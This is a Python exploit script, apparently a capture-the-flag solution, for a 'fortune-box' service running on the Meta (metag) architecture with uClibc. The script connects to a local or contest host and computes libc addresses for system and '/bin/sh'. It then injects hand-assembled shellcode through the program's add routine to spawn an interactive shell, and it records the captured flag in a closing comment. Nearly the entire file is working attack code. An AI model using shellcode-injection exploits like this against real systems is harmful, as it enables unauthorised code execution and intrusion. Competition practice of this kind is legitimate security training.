#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './fortune-box'
context(os = 'linux', endian = 'little')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':1337}, \
                        remote  = {'host':'flu.xxx', 'port':10150})
env.select()

#==========

binf = ELF(bin_file)

libc = ELF('rootfs/lib/libuClibc-1.0.44.so')
libc.address        = 0x0800d000
addr_libc_system    = libc.sep_function['___libc_system']
addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

#==========

def attack(conn, **kwargs):
    fb = FortuneBox(conn, b'a')

    for _ in range(14):
        fb.add(b'\x00')

    target = addr_libc_system

    '''
    $ ~/Documents/binutils-2.41/build/binutils/objdump -b binary -m metag -EL -D test.bin
    00000000 <.data>:
       0:   a0000020                  B         0x4
       4:   0318404d                  MOVT      D1Ar1,#0x809
       8:   031de1e0                  ADD       D1Ar1,D1Ar1,#0xbc3c
       c:   03004035                  MOVT      D1Re0,#0x806
      10:   03062780                  ADD       D1Re0,D1Re0,#0xc4f0
      14:   a30008a0                  MOV       PC,D1Re0
    '''
    shellcode  = p32(0xa0000020) # B 0x4
    shellcode += p32(0x03180005 + ((addr_libc_str_sh >> 16) << 3))          
    shellcode += p32(0x03180000 + ((addr_libc_str_sh & ((1<<16)-1)) << 3))
    shellcode += p32(0x03000005 + ((addr_libc_system >> 16) << 3))
    shellcode += p32(0x03000000 + ((addr_libc_system & ((1<<16)-1)) << 3))
    shellcode += p32(0xa30008a0)
    fb.add(shellcode)

    '''
    with open('test.bin', 'wb') as f:
        f.write(shellcode)
    '''

class FortuneBox:
    def __init__(self, conn, name):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

        self.sendlineafter(b'name: ', name)

    def add(self, data):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'?\n', data)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{wh0_n3ed5_risc5_1f_y0u_got_META}

if __name__=='__main__':
    main()

#==========
